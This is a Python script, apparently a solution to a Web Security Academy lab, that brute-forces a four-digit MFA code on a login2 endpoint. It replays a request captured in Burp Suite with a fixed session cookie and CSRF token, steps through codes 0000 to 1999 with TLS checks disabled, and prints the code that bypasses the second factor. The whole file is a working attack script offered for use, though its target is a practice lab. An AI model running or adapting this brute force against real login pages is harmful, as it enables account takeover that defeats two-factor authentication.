# 
## Stage 1: importing the libraries to be used.
import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

## Stage 2: Copy the request in a python format.
burp0_url = "https://0a44000e0310bd1a812edf0b000a00a3.web-security-academy.net:443/login2"
burp0_cookies = {"session": "jDnHXtHO7x1lu0UO6EgUGDSXbELD64jR"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a44000e0310bd1a812edf0b000a00a3.web-security-academy.net", "Referer": "https://0a44000e0310bd1a812edf0b000a00a3.web-security-academy.net/login2", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}

## Stage 3: Setting the proxies to allow the traffic to be processed in burpsuite.
proxies1 =  {"http" : "http://127.0.0.1:8080/" , "https" : "http://127.0.0.1:8080/"} # this is proxy header .

for i in range (0000,2000,1): # Step 4: Set the main for loop for the whole range of the attack.
    m = "%s" %i # Changing the integer value i to be a string value.

    if i < 10: # if condition to allow the value included to be in a 4-digits string for a 1-digit string numbers.
        burp0_data = {"csrf": "mZxbK31OAI3fISDLsmH3TxelUYbed2os", "mfa-code": "000%s" %m} # burp data to be manipulated.
        r = requests.post(url=burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False, proxies=proxies1) # burp data to be included.
        if "Invalid CSRF token (session does not contain a CSRF token)" not in r.text: # conditional statement for terminating the program upon getting the OTP
            print("The OTP is: 000%s" %m) # displaying the OTP that bypasses the program.
            sys.exit(-1) # terminate the code

    if i >= 10 and i <100:# if condition to allow the value included to be in a 4-digits string for a 2-digits string numbers.
        burp0_data = {"csrf": "mZxbK31OAI3fISDLsmH3TxelUYbed2os", "mfa-code": "00%s" %m} # burp data to be manipulated.
        r = requests.post(url=burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False, proxies=proxies1) # burp data to be included.
        if "Invalid CSRF token (session does not contain a CSRF token)" not in r.text: # conditional statement for terminating the program upon getting the OTP
            print("The OTP is: 00%s" %m) # displaying the OTP that bypasses the program.
            sys.exit(-1) # terminate the code
    if i >= 100 and i < 1000: #  if condition to allow the value included to be in a 4-digits string for a 3-digits string numbers.
        burp0_data = {"csrf": "mZxbK31OAI3fISDLsmH3TxelUYbed2os", "mfa-code": "0%s" %m} # burp data to be manipulated.
        r = requests.post(url=burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False, proxies=proxies1) # burp data to be included.
        if "Invalid CSRF token (session does not contain a CSRF token)" not in r.text: # conditional statement for terminating the program upon getting the OTP
            print("The OTP is: 0%s" %m) # displaying the OTP that bypasses the program.
            sys.exit(-1) # terminate the code

    if i >= 1000: #  if condition to allow the value included to be in a 4-digits string for a 4-digits string numbers.
        burp0_data = {"csrf": "mZxbK31OAI3fISDLsmH3TxelUYbed2os", "mfa-code": "%s" %m} # burp data to be manipulated.
        r = requests.post(url=burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False, proxies=proxies1) # burp data to be included.
        if "Invalid CSRF token (session does not contain a CSRF token)" not in r.text: # conditional statement for terminating the program upon getting the OTP
            print("The OTP is: %s" %m) # displaying the OTP that bypasses the program.
            sys.exit(-1) # terminate the code